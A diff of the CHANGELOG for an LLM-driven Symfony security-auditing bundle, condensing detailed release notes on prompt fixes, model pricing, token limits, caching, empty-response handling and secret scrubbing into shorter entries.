-  console listing, the `--format=json` `vulnerabilities` array, and the SARIF
-  `results` array all lead with the most severe findings.
-- **Reviewer no longer drops real-but-hard-to-prove findings.** The reviewer
-  decision rules in `ReviewerPromptBuilder`
-  (`src/Audit/Infrastructure/Prompt/ReviewerPromptBuilder.php`) opened with
-  `Be strict: reject any finding where exploitation is not clearly demonstrated`
-  — and current models follow that literally, silently discarding the very class
-  of issues the auditor exists to surface (race conditions, business-logic
-  flaws, context-dependent access control). The rules now invert the default:
-  reject only when a specific mitigating control can be named (a guard clause, a
-  parameterized query, an `access_control` rule, a framework default) or the
-  pattern is absent; when the pattern is present but exploitability is
-  uncertain, the reviewer accepts it with a downgraded severity (down to `info`)
-  and records the missing evidence in `reviewer_notes` instead of rejecting. The
-  false-positive playbook — which rejects against concrete Symfony mitigations —
-  is unchanged, so precision on known-safe patterns is preserved.
-- **The attacker's Route Access-Control Map now flags firewall-covered routes
-  instead of mislabelling them as unprotected.** `AttackerPromptBuilder`
-  (`src/Audit/Infrastructure/Prompt/AttackerPromptBuilder.php`) rendered every
-  controller action with no `#[IsGranted]` / `denyAccessUnlessGranted()` as
-  `LACKS_ACCESS_CHECK`, even when a `security.yaml` `access_control` rule
-  already gated the route path — so the attacker flagged it as
-  `broken_access_control` and the reviewer then spent tool calls (or, in batch
-  mode, lacked the tools) rediscovering the firewall rule. The map now
-  cross-references each route path against the `access_control` patterns already
-  parsed into `SymfonyMapping::routeAccessMap()` and, on a match, tags the line
-  `COVERED_BY access_control[…]` with the gating roles, telling the model the
-  firewall protects it (unless the role is too permissive). This removes a whole
-  class of false positive at zero extra LLM cost. The attacker `PROMPT_VERSION`
-  is bumped `7` → `8`, invalidating previously cached responses.
+- `audit.attacker_max_concurrent` analyzes cache-miss attacker chunks concurrently when the platform has an async transport (`fast` profile: `4`, `balanced` and `thorough`: `1`), with identical results to the sequential path; it is ignored when `audit.tools_enabled` is on or `audit.structured_collection` is off ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- `audit.stable_system_prompt` (default `true`) sends the full attacker skill set on every chunk so the system prompt is byte-identical and provider prompt caching (Anthropic, OpenAI, Gemini, DeepSeek) reads it after the first call; set it to `false` for relevance-only skills and a smaller prompt on providers without caching ([#46](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/46), [#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- Reviewer verdicts are cached across runs in a `reviewer` folder under `cache.dir` when `cache.enabled` is on, so an unchanged finding on unchanged code skips the reviewer LLM call; `--no-cache` bypasses it ([#49](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/49))
+- The attacker cache now also covers iterations 2 and later, where chunks carrying prior validated or rejected findings used to bypass it ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
 
-### Fixed
+### Core 🧱
 
-- **Attacker prompt no longer contradicts itself in the default
-  structured-collection mode.** `AttackerPromptBuilder::buildUserMessage()`
-  (`src/Audit/Infrastructure/Prompt/AttackerPromptBuilder.php`) always closed
-  the user message with `Return a JSON array of all vulnerabilities found.`,
-  even when `audit.structured_collection` is enabled (the default), where the
-  system prompt forbids JSON-array output and mandates `record_vulnerability`
-  tool calls. The conflicting instruction could push the model to emit a stray
-  JSON array that the pipeline then discards as malformed. The closing line is
-  now conditional: structured mode tells the model to record findings via the
-  `record_vulnerability` tool, and only the opt-out
-  (`structured_collection: false`) path keeps the JSON-array wording. The
-  attacker `PROMPT_VERSION` is bumped `6` → `7`, invalidating previously cached
-  attacker responses so the corrected prompt takes effect.
-- **Reviewer can now relabel a finding to `over_permissive_serializer_group`.**
-  The `corrected_type` enum advertised to the reviewer in
-  `ReviewerPromptBuilder`
-  (`src/Audit/Infrastructure/Prompt/ReviewerPromptBuilder.php`) listed 39 of the
-  40 `VulnerabilityType` cases — `over_permissive_serializer_group`, which the
-  attacker can already emit, was missing, so the reviewer could neither correct
-  a mislabelled finding to it nor recognise it as a valid type. The value is now
-  listed, and a regression test asserts every `VulnerabilityType` case appears
-  in both the attacker and reviewer prompts so the two enumerations cannot drift
-  apart again.
-- **`audit:run --dry-run` no longer undercounts tokens for Claude Fable 5 /
-  Mythos 5.** `CharacterBasedTokenEstimator`
-  (`src/Audit/Infrastructure/LLM/CharacterBasedTokenEstimator.php`) matched
-  `claude-fable-5` and `claude-mythos-5` against the generic `claude-` prefix
-  (3.5 characters per token), but those models ship a new tokenizer that emits
-  roughly 30% more tokens for the same text. The estimate was therefore about a
-  third too low, which flows straight into the dry-run cost figure. Two
-  more-specific prefixes (`claude-fable`, `claude-mythos`) are now matched ahead
-  of `claude-` with a denser 2.7-characters-per-token ratio, so the dry-run
-  estimate reflects the real token count. Non-Fable Claude models are unchanged.
+- Cached attacker answers refresh once after upgrading ([#41](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/41), [#47](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/47), [#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
 
 ## [1.8.0] — 2026-06-11 — Fable
 
-A model-coverage release. Anthropic's Claude Fable 5 — released the day before —
-is now priced in the cost estimator, so `audit:run --dry-run` reports a real
-figure for it instead of a misleading `$0.00`.
+### New Features ✨
 
-### Added
+- Cost estimates cover Claude Fable 5 (`claude-fable-5`, `$10/$50` per million input/output tokens), so `audit:run --dry-run` reports a real figure instead of `$0.00` ([#38](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/38))
 
-- **Cost estimates now cover Claude Fable 5 (`claude-fable-5`).**
-  `StaticPricingProvider`
-  (`src/Audit/Infrastructure/Pricing/StaticPricingProvider.php`) gained the
-  entry `'claude-fable-5' => [10.00, 50.00]` (USD per million input/output
-  tokens, Anthropic list price). Before this, configuring `claude-fable-5` made
-  `PricingProviderInterface::hasModel()` return `false`, so a dry run estimated
-  `$0.00` and logged a `No pricing entry for LLM model` warning (and, since
-  1.7.2, the `AuditPresenter` stderr notice). The pricing table's source-date
-  comment is bumped to `2026-06-11`. Every provider's entries (Anthropic,
-  OpenAI, Google, Mistral, Cohere, DeepSeek, Perplexity, Cerebras) were
-  re-verified against current published list prices on 2026-06-11; two stale
-  entries were corrected (see _Fixed_ below), the rest are unchanged.
+### Bugfixes 🐛
 
-### Changed
-
-- **`docs/faq.md` documents Claude Fable 5.** The Model Selection table gains a
-  "Most demanding" row (`attacker_model: claude-fable-5` +
-  `reviewer_model: claude-haiku-4-5-20251001`), and the cost table gains a
-  "Claude Fable 5 only" row (≈ `$6 – $16` per run — roughly 2× Claude Opus, in
-  line with the `$10/$50` vs `$5/$25` per-MTok pricing).
-
-### Fixed
-
-- **Corrected stale list prices for two non-Anthropic models in the cost
-  estimator.** During the 2026-06-11 re-verification of every provider's pricing
-  in `StaticPricingProvider`, two entries no longer matched the provider's
-  published list price and were producing inaccurate `audit:run --dry-run`
-  estimates:
-  - `mistral-small-latest` / `mistral-small-2603`: `$0.15/$0.60` → `$0.10/$0.30`
-    per million input/output tokens.
-  - `deepseek-v4-pro`: `$1.74/$3.48` → `$0.435/$0.87` per million input/output
-    tokens.
-
-  All other entries across Anthropic, OpenAI, Google, Cohere, Perplexity, and
-  Cerebras matched their current list prices and are unchanged.
+- Cost estimator: corrected stale list prices for `mistral-small-latest` and `mistral-small-2603` (`$0.10/$0.30`) and `deepseek-v4-pro` (`$0.435/$0.87`) per million input/output tokens ([#38](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/38))
 
 ## [1.7.2] — 2026-06-07 — Lighthouse
 
-A dry-run transparency release. `audit:run --dry-run` no longer hides an
-unsupported model behind a silent `$0.00` estimate: it now warns, on stderr,
-whenever a configured model has no pricing data, so a typo or an as-yet-unpriced
-model can no longer masquerade as free.
+### Bugfixes 🐛
 
-### Fixed
-
-- **`audit:run --dry-run` now warns when a configured model has no pricing
-  data.** A dry run estimates cost via `EstimateAuditCostUseCase` →
-  `CostCalculator` → `StaticPricingProvider`. For a model absent from the
-  provider's price table (a typo, or a model `symfony/ai` supports but the table
-  does not yet list), `StaticPricingProvider` returns `0.0` and logs a
-  `No pricing entry for LLM model` warning to the PSR logger only — invisible on
-  the console. The dry run therefore reported `Cost : $0.0000 (estimate)` with
-  no hint that the figure was unreliable, so an unsupported `model` /
-  `attacker_model` / `reviewer_model` looked free. `AuditPresenter`
-  (`src/Command/AuditPresenter.php`) now inspects the per-role models of the
-  estimate against `PricingProviderInterface::hasModel()` and emits a stderr
-  warning before the cost block:
-
-  ```text
-  No pricing data for the configured model(s): <model>. The dry-run cost
-  estimate shows $0.00 for these and may be inaccurate. Check the model name(s)
-  in your symfony_security_auditor configuration against the models supported by
-  your symfony/ai platform.
-  ```
-
-  The warning is written to `getErrorStyle()`, so it surfaces even for
-  `--format=json` / `--format=sarif` without polluting machine-readable stdout.
+- `audit:run --dry-run`: warns on stderr, also for `--format=json` and `--format=sarif` without polluting stdout, when a configured `model`, `attacker_model` or `reviewer_model` has no pricing data, instead of silently reporting `$0.00` ([#37](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/37))
 
 ## [1.7.1] — 2026-06-04 — Parachute
 
-A bare-install resilience release. Installing the bundle into a fresh Symfony
-skeleton — where the `symfony/ai-bundle` recipe ships `config/packages/ai.yaml`
-with every platform commented out — no longer breaks container compilation.
+### Bugfixes 🐛
 
-### Fixed
-
-- **`cache:clear` no longer crashes when no AI platform is configured.** The
-  bundle's three `SymfonyAiLLMClient` service definitions
-  (`src/SymfonySecurityAuditorBundle.php`) hard-referenced
-  `Symfony\AI\Platform\PlatformInterface`. On a bare skeleton the
-  `symfony/ai-bundle` recipe registers no platform, so the alias never exists
-  and `CheckExceptionOnInvalidReferenceBehaviorPass` aborted **every** console
-  command (`cache:clear`, `cache:warmup`, recipe CI installs) with:
-
-  ```text
-  The service "security_auditor.attacker_client" has a dependency on a
-  non-existent service "Symfony\AI\Platform\PlatformInterface"
-  ```
-
-  The references are now declared `nullOnInvalid()` and the client constructor
-  accepts `?PlatformInterface`, so the container compiles without a platform.
-  The first actual LLM call raises the new `MissingAiPlatformException` (extends
-  `LLMProviderException`, so agents rethrow it instead of swallowing it into a
-  false-negative SAFE report) with an actionable message:
-
-  ```text
-  No AI platform is configured. Enable a platform (e.g. "anthropic") in
-  config/packages/ai.yaml and set its API key — the symfony/ai-bundle recipe
-  ships with every platform commented out.
-  ```
-
-  Every other console command keeps working; only `audit:run` needs a platform.
+- Console commands such as `cache:clear` and `cache:warmup` no longer fail when no AI platform is configured (a fresh skeleton, where the `symfony/ai-bundle` recipe comments every platform out); only the first LLM call raises the new `MissingAiPlatformException` with an actionable message ([#35](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/35))
 
 ## [1.7.0] — 2026-05-29 — Polyglot
 
-### Fixed
+### New Features ✨
 
-- **Non-Anthropic providers no longer crash on `cache_control` / `max_tokens`.**
-  `SymfonyAiLLMClient::baseOptions()` sent Anthropic-dialect options on every
-  call regardless of the configured provider. The `symfony/ai` Gemini bridge
-  forwards unrecognized options verbatim into `generationConfig`, so a normal
-  run on a `gemini-*` model aborted with
-  `Invalid JSON payload received. Unknown name "cache_control" at 'generation_config'`
-  / `Unknown name "max_tokens" at 'generation_config'`. The OpenAI Responses
-  bridge (which expects `max_output_tokens`) was hit by the same `max_tokens`
-  leak. Provider-specific options (`max_tokens`, `response_format`) are now
-  gated to Claude models; every other provider receives only `temperature` and
-  uses its own native (large) output limit, so long findings are no longer
-  truncated.
+- Cost estimates cover every commercial platform shipped by `symfony/ai` (Anthropic including `claude-opus-4-8`, OpenAI including the GPT-5 family, Google Gemini including `gemini-3.1-pro-preview`, Mistral, Cohere, DeepSeek, Perplexity and Cerebras); prompt-size-tiered models are priced at their base tier and self-hosted platforms stay unpriced ([#34](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/34))
 
-### Added
+### Deprecations 💀
 
-- **Pricing coverage for every commercial platform shipped by `symfony/ai`.**
-  `StaticPricingProvider` now carries current standard-tier prices for Anthropic
-  (including `claude-opus-4-8`), OpenAI (including the GPT-5 family), Google
-  Gemini (including `gemini-3.1-pro-preview`), Mistral, Cohere, DeepSeek,
-  Perplexity, and Cerebras — with dated-snapshot aliases where providers pin
-  them. Prompt-size-tiered models (Gemini `*-pro`, GPT-5.x) are listed at their
-  base tier. Self-hosted platforms (Ollama, LM Studio, Docker Model Runner,
-  TransformersPHP) stay absent — they bill no per-token cost. This clears the
-  `No pricing entry for LLM model — cost reporting will show zero` warning for
-  current models.
+- `cache.prompt_caching` no longer has any effect and emits a deprecation notice when set; set `cache_retention` (`none`, `short` or `long`) on the `anthropic` platform in `ai.yaml` instead (OpenAI and Gemini cache automatically); the key stays accepted until the next major ([#34](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/34))
 
-### Deprecated
+### Bugfixes 🐛
 
-- **`cache.prompt_caching`** no longer has any effect and emits a deprecation
-  notice when set. It previously put `cache_control: ephemeral` on every LLM
-  call, but current `symfony/ai` bridges no longer read that option. Configure
-  prompt caching on the platform instead: set `cache_retention` (`none` |
-  `short` | `long`) on the `anthropic` platform in `ai.yaml` (default `short`
-  already enables the ~90% input-token discount); OpenAI and Gemini cache
-  automatically. The key stays accepted for backward compatibility until the
-  next major. See [`docs/versioning.md`](docs/versioning.md).
+- Non-Anthropic providers no longer crash on Anthropic-only options: `cache_control` and `max_tokens` made Gemini runs abort and `max_tokens` broke the OpenAI Responses bridge, so `max_tokens` and `response_format` are now sent to Claude models only and other providers use their native output limit ([#34](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/34))
 
 ## [1.6.4] — 2026-05-29 — Hush
 
-A log-hygiene release. `audit:run` no longer emits a `warning` when the
-attacker's structured-collection tool loop ends with empty content after at
-least one tool-using iteration — that is the intended termination signal in
-structured-collection mode, not an error.
+### New Features ✨
 
-### Fixed
+- The console report no longer prints the `Cost` line and per-role cost breakdown after a real run, since it is only a rough estimate that diverges from provider invoices; the token line, the `--dry-run` estimate and `estimated_cost_usd` in the JSON and SARIF outputs are unchanged ([#33](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/33))
 
-- **`Tool-using loop ended with empty content response` no longer fires at
-  `warning` level for normal-flow completions.** In structured-collection mode
-  (default since 1.6.0), the attacker emits findings via `record_vulnerability`
-  tool calls and is contracted to return no final prose — the empty content
-  block is how the model says "I'm done."
-  `SymfonyAiLLMClient::emptyToolLoopResponseAndLog()`
-  (`src/Audit/Infrastructure/LLM/SymfonyAiLLMClient.php`) was logging at
-  `warning` level regardless of iteration count, spamming the audit output once
-  per chunk on healthy runs (typical signature:
-  `iterations: 1, output_tokens: 1485, error: "Response does not contain any content."`).
-  The log now routes through `debug` when at least one tool-using iteration has
-  produced findings before the empty turn, and only stays at `warning` when the
-  very first call returns empty (genuine anomaly — refusal, content filter, or
-  provider quirk before any work was done). The message string and payload shape
-  are unchanged so existing log scrapers / dashboards continue to match.
-- **Cost line removed from the real-run console report.**
-  `ReportRenderer::renderConsole()`
-  (`src/Audit/Infrastructure/Report/ReportRenderer.php`) used to print
-  `Cost    : $X.XXXX` and a per-role breakdown after every audit. The number
-  comes from a static `PricingProvider` table multiplied against actual token
-  usage, so it's a rough estimate that diverges from real provider invoices
-  (volume discounts, contract pricing, prompt-cache rebates) and operators
-  shouldn't anchor on it. The tokens line still prints (factual, model-tagged),
-  and the dry-run path (`AuditPresenter::dryRunResult()`) is unchanged —
-  estimating cost is its whole point. JSON and SARIF outputs still carry
-  `estimated_cost_usd` for downstream parsers / dashboards.
+### Bugfixes 🐛
+
+- `Tool-using loop ended with empty content response`: no longer logged at `warning` level when the attacker ends a chunk with an empty answer after recording findings through tool calls, which is the normal end of a structured-collection run; it is logged at `debug`, and the warning stays for an empty answer on the very first call ([#33](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/33))
 
 ## [1.6.3] — 2026-05-28 — Watertight
 
-A bug-fix release closing a credential-leak gap in the secret scrubber. URIs
-with embedded credentials — the canonical Symfony `DATABASE_URL` / `REDIS_URL`
-shape — were sent verbatim to the LLM provider because no pattern matched them.
-The scrubber now redacts connection-string credentials before any content leaves
-the machine.
+### Bugfixes 🐛
 
-### Fixed
-
-- **Connection-string credentials leaked to the LLM.** `RegexSecretScrubber`
-  (`src/Audit/Infrastructure/FileSystem/RegexSecretScrubber.php`) had no pattern
-  for URIs with embedded credentials, so values like
-  `DATABASE_URL=postgres://user:s3cret@host` or `REDIS_URL=redis://:pass@host`
-  were sent verbatim to the LLM provider — the env-assignment pattern only
-  matches names ending in `_TOKEN`/`_SECRET`/`_PASSWORD`/`_KEY`/`_DSN`, never
-  `_URL`. A new `connection_uri` pattern surgically redacts the `user:pass@`
-  segment while preserving the scheme and host
-  (`postgres://***REDACTED:connection_uri***@host`).
+- Secret scrubbing: credentials embedded in connection strings such as `DATABASE_URL=postgres://user:s3cret@host` or `REDIS_URL=redis://:pass@host` are now redacted before the content is sent to the LLM provider, keeping the scheme and host (`postgres://***REDACTED:connection_uri***@host`) ([#32](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/32))
 
 ## [1.6.2] — 2026-05-28 — Headroom
 
-A bug-fix release. The audit was silently truncating every LLM call at ~1000
-output tokens because `symfony/ai`'s Anthropic bridge defaults `max_tokens` to
-`1000` when callers don't supply one, and the bundle never did. The bundle now
-sets `max_tokens` explicitly on every platform request and exposes the value as
-a public configuration key.
+### New Features ✨
 
-### Fixed
+- Add the `max_output_tokens` configuration key (default `4096`), which sets the output-token limit of every LLM call ([#31](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/31))
+- Add `attacker_max_output_tokens` and `reviewer_max_output_tokens` to override that limit per role, so the attacker can get more room (for example `8192`) than the reviewer (for example `2048`); both fall back to `max_output_tokens` when unset ([#31](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/31))
 
-- **Silent 1000-token output cap.** `SymfonyAiLLMClient::baseOptions()`
-  (`src/Audit/Infrastructure/LLM/SymfonyAiLLMClient.php`) never set `max_tokens`
-  on platform invocations. `symfony/ai`'s Claude bridge then applied its
-  built-in `max_tokens = 1000` default, capping every attacker / reviewer /
-  cheap-attacker call. In structured-collection mode this cut off
-  `record_vulnerability` tool-call arguments mid-finding (severity, location,
-  proof, remediation fields), inflated tool-loop iteration counts, and most
-  visibly surfaced as
-  `WARNING [app] Tool-using loop ended with empty content response` log lines
-  with cumulative `output_tokens` clustering at ~1000 × `iterations`.
-  `baseOptions()` now sets `max_tokens` from the new
-  `LLMConfiguration::maxOutputTokens` / `attackerMaxOutputTokens` /
-  `reviewerMaxOutputTokens` accessors so the value is bounded by bundle
-  configuration rather than the upstream default.
+### Bugfixes 🐛
 
-### Added
+- LLM calls are no longer cut off at about 1000 output tokens: the bundle now sets `max_tokens` explicitly, where the Anthropic bridge's default truncated findings mid-way and produced `Tool-using loop ended with empty content response` warnings ([#31](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/31))
 
-- **`max_output_tokens` configuration key** — top-level `int`, default `4096`.
-  Sets `max_tokens` on every LLM call. The new default is enough headroom for
-  detailed `record_vulnerability` tool-call arguments on a typical chunk while
-  staying well inside provider per-response ceilings. Public API per
-  `docs/versioning.md`.
-- **`attacker_max_output_tokens` / `reviewer_max_output_tokens`** — optional
-  per-role overrides (`int|null`, default `null`). Fall back to
-  `max_output_tokens` when null. Mirrors the existing `attacker_model` /
-  `reviewer_model` split, so split-model setups can give the attacker more
-  headroom for detailed findings (e.g. `8192`) while leaving the reviewer on a
-  tighter cap (e.g. `2048`).
+### Core 🧱
 
-### Notes
-
-- This release sets `max_tokens` explicitly on every request where it previously
-  omitted the option. Existing audits will see longer (untruncated) completions,
-  fewer tool-loop iterations per chunk, and an effectively higher output-token
-  spend per call.
-- When raising `max_output_tokens` substantially, consider raising
-  `audit.rate_limit.output_tokens_per_minute` proportionally — see
-  [`docs/configuration.md`](docs/configuration.md). With the default `4096` cap
-  and an `80_000` OTPM ceiling the limiter trips after ~19 calls/min; doubling
-  the cap halves that.
+- Audits now get complete answers, so expect fewer tool-loop iterations per chunk and a higher output-token spend per call; when you raise `max_output_tokens`, raise `audit.rate_limit.output_tokens_per_minute` too, since the default `4096` with an `80_000` ceiling trips the limiter after about 19 calls per minute ([#31](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/31))
 
 ## [1.6.1] — 2026-05-28 — Soft Landing
 
-A resilience release. The LLM client now treats truly empty model responses as a
-graceful drop instead of a fatal abort, and the mutation gate becomes
-deterministic on `AuditContext::auditId` so the test matrix stops flapping on
-randomness.
+### Bugfixes 🐛
 
-### Fixed
-
-- **Empty-content LLM responses no longer abort the audit.** Anthropic (and
-  other providers) occasionally return a successful response with zero content
-  blocks — refusal-style stops, content-filter hits, or quirks under heavy
-  prompt-cache pressure. `symfony/ai`'s converter then throws "Response does not
-  contain any content." from `DeferredResult::getResult()`. Previously that
-  bubbled through `SymfonyAiLLMClient::invokeWithRetry()` →
-  `TransientFailureClassifier` (no transient match) →
-  `NonTransientLLMFailureException`, aborting the entire audit mid-run — most
-  visibly at ~50% on a long `audit.structured_collection: true` run where the
-  attacker had already recorded findings via `record_vulnerability` tool calls.
-  `TransientFailureClassifier` now exposes `isEmptyContent()`; the client
-  rethrows those as the new internal `EmptyLLMResponseException`, and
-  `complete()` / `completeWithTools()` catch and translate into an empty
-  `LLMResponse` with `stopReason: 'empty_content'`. The attacker chunk records
-  as `analyzed`, the `VulnerabilityCollector` still drains any
-  `record_vulnerability` calls that preceded the empty turn, and the pipeline
-  continues. The retry classifier is unchanged for transport / auth / rate-limit
-  failures — only the framework-level "no content blocks" signature is reclassed
-  out of the non-transient path.
-
-### Tooling
-
-- Mutation gate now deterministically kills the `UnwrapStrToUpper` mutant on
-  `AuditContext::forProject()`'s `auditId` formatting. The single-draw assertion
-  let the mutant escape whenever `bin2hex(random_bytes(4))` rolled all digits
-  (~2.33% per Infection run, ~19% across the 9-cell PHP × Symfony matrix) — the
-  source of the matrix-cell-specific escapes recently observed on `main`. The
-  test now loops 64 draws, dropping the escape probability to ~10⁻¹⁰⁴.
+- An LLM response with no content (refusal-style stop, content filter, prompt-cache quirk) no longer aborts the audit with `Response does not contain any content.`: the chunk counts as analyzed, findings already recorded through tool calls are kept, and the audit goes on ([#30](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/30))
 
 ## [1.6.0] — 2026-05-28 — Sentinel
 
-A correctness release. The attacker now records findings through a strict
-JSON-Schema tool call validated by the provider, replacing the JSON-array parse
-path as the default. Bundle-level switch keeps the legacy path available for
-environments without tool-use support.
+### New Features ✨
 
-### Added
+- Collect the attacker's findings through a `record_vulnerability` tool call whose input is a strict JSON Schema validated by the provider, so bare-string and wrapper-object drift in the model output cannot happen with Anthropic, OpenAI, Mistral and tool-capable Ollama models ([#29](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/29))
+- Add `audit.structured_collection` (default `true`); existing audits switch to tool-call collection on upgrade, and `false` keeps the JSON-array path for models without tool-use support ([#29](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/29))
+- Tighten the JSON-array prompt used when `audit.structured_collection` is `false`: it forbids non-object array elements, environment-keyed wrapper objects and bare environment-name strings, which were previously dropped silently ([#29](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/29))
 
-- **Schema-enforced finding collection.** New `RecordVulnerabilityTool` exposes
-  a `record_vulnerability` tool with a strict JSON-Schema input mirroring the
-  `Vulnerability` shape. The attacker now calls this tool once per finding
-  instead of returning a JSON array; the provider validates each call against
-  the schema before the agent ever sees it, making bare-string drift (`"dev"`,
-  `"test"`) and wrapper-object drift (`{"vulnerabilities": [...]}`) structurally
-  impossible across Anthropic, OpenAI, Mistral, and tool-capable Ollama models.
-- **`audit.structured_collection` config key** — `true` by default. Set to
-  `false` to fall back to the tightened JSON-array prompt path, which remains as
-  the safety net for models without tool-use support. Public API per
-  `docs/versioning.md`.
-- **`VulnerabilityCollector` and `RecordVulnerabilityToolFactoryInterface`**
-  (Application). The collector is the documented mutable context carrier the
-  tool writes into; the factory is the seam Infrastructure plugs into so the
-  agent can build a fresh collector + tool pair per chunk without importing
-  Infrastructure types. The bundle wires `RecordVulnerabilityToolFactory`
-  (Infrastructure) at the composition root.
-- **Tightened JSON-array safety net.** When `audit.structured_collection` is set
-  to `false`, the prompt explicitly forbids non-object array elements,
-  environment-keyed wrapper objects, and bare environment-name strings — the
-  failure modes that previously slipped past the parser and were silently
-  dropped by `VulnerabilityFactory::fromList()`. Both paths ship in this
-  release; the JSON-array path is now opt-in.
+### Core 🧱
 
-### Changed
-
-- **Default attacker collection mechanism is now the `record_vulnerability` tool
-  call.** Existing audits that did not pin `audit.structured_collection` will
-  switch to the tool-call path on upgrade and benefit from provider-side schema
-  validation. Behavior is preserved for opt-out users: set
-  `audit.structured_collection: false` in
-  `config/packages/symfony_security_auditor.yaml` to keep the JSON array path.
+- Add `VulnerabilityCollector` and `RecordVulnerabilityToolFactoryInterface`, the seam that lets the attacker build a fresh collector and tool per chunk without importing Infrastructure types ([#29](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/29))
 
 ## [1.5.0] — 2026-05-28 — Cartographer
 
-A visibility, hardening, and coverage release. The auditor now reports how much
-LLM output it had to drop on the floor, warns operators on stderr when sensitive
-content will be sent to the cloud unscrubbed, looks for over-permissive
-serializer groups on entities, and parses controller routes and access-control
-attributes into a graph fed to the attacker prompt. Every change is backward
-compatible — no existing key, default, exit code, JSON/SARIF schema field, or
-Domain port signature changed.
+### New Features ✨
 
-### Added
+- Map every controller route with its `#[IsGranted]` attributes and `denyAccessUnlessGranted()` calls, and flag the routes that check nothing ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Match each `#[IsGranted('ATTR', $subject)]` against the voters that actually accept that attribute and subject, and report a `missing_voter` finding when none does ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Map every `createForm(SomeFormType::class)` call to its controller, so the audit reviews mass-assignment and CSRF exposure per form ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Add the `over_permissive_serializer_group` finding (OWASP A05:2021): privileged fields such as `roles` or `isAdmin` in write groups, and sensitive fields in read groups, on `#[Groups(...)]` and `@Groups({...})` ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Count the findings the model proposed but the auditor dropped as malformed, by reason, in the `Attacker agent complete` log line (`total_dropped_entries`, `dropped_by_reason`) ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Reject nonsensical model output (empty file paths, oversized descriptions) before it reaches the report ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
+- Warn on stderr when `scan.secret_scrubbing.enabled` is `false`, since file contents then go to the LLM provider as they are; the warning never pollutes `--format=json|sarif` output ([#28](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/28))
 
-- **Visible hydration drops.** `VulnerabilityFactory::fromList()` now returns a
-  `VulnerabilityHydrationResult` value object (vulnerabilities + drop counts
-  bucketed by `VulnerabilityDropReason`: `non_array_entry`, `validation_failed`,
-  `hydration_failed`). Each drop is logged with a structured `reason` code, and
-  per-audit totals appear on the `Attacker agent complete` info log line under
-  `total_dropped_entries` / `dropped_by_reason` — so silent loss of an LLM-
-  proposed vulnerability is no longer invisible to operators.
-- **`symfony/validator` constraints on hydrated findings.** The factory now
-  validates raw LLM payloads against `Assert\Collection` constraints (non-blank
-  `title` / `description` / `file_path`, sane length bounds on all free-text
-  fields) and drops violators under the new `validation_failed` reason, with the
-  structured violation messages in the log payload. Catches pathological LLM
-  output (empty file paths, 100 KB descriptions) that previously slipped through
-  `Vulnerability::create`'s coarser guards.
-- **Secret-scrubbing pre-flight warning.** `audit:run` now emits a one-shot
-  warning on **stderr** after the header when `scan.secret_scrubbing.enabled` is
-  set to `false`, explaining that file contents will be sent verbatim to the
-  configured LLM provider. Routing to stderr means the warning always surfaces
-  (including when `--format=json|sarif` writes to stdout) without polluting the
-  parseable machine-readable payload. The default (`true`) is unchanged.
-- **`over_permissive_serializer_group` coverage.** New
-  `VulnerabilityType::OVER_PERMISSIVE_SERIALIZER_GROUP` (category
-  Symfony-Specific, OWASP A05:2021) plus a `RegexStaticPreScanner` marker for
-  the PHP-attribute and annotation forms of `#[Groups(...)]` / `@Groups({...})`
-  on entities. The attacker entity skill block now flags privileged fields
-  (`roles`, `isAdmin`, `passwordHash`, `apiToken`) landing in write-side groups
-  (`*:write`) and sensitive fields leaking via read-side groups (`*:read`,
-  `public`).
-- **Full route → controller → voter → form semantic graph.** Three new Domain
-  ports (`ControllerAccessControlParserInterface`,
-  `VoterCapabilityParserInterface`, `FormBindingParserInterface`) with AST-based
-  default implementations (backed by `nikic/php-parser`):
-  - `PhpParserControllerAccessControlParser` walks every controller and emits
-    one `RouteAccessControl` per public action, capturing the
-    `#[Route(path:, methods:)]` attribute, both class- and method-level
-    `#[IsGranted(...)]`, and `denyAccessUnlessGranted()` call sites.
-  - `PhpParserVoterCapabilityParser` walks every voter file and emits a
-    `VoterCapability` describing the attribute strings and `instanceof` subject
-    types referenced inside its `supports()` body.
-  - `PhpParserFormBindingParser` walks every controller and emits one
-    `FormBinding` per `$this->createForm(SomeFormType::class)` call site.
+### Core 🧱
 
-  `SymfonyMapping` gains `routeAccessControls()`,
-  `controllersWithoutAccessCheck()`, `voterCapabilities()`, `votersFor()`,
-  `formBindings()`, and `formBindingsForController()` accessors. `MappingStage`
-  populates the graph and surfaces `mapping.routes`,
-  `mapping.routes_without_access_check`, `mapping.voter_capabilities`, and
-  `mapping.form_bindings` metadata on `AuditContext`. The attacker prompt now
-  ships three new context blocks — `Route Access-Control Map`, `Voter Coverage`,
-  and `Form Bindings` — so the LLM can cross-reference an
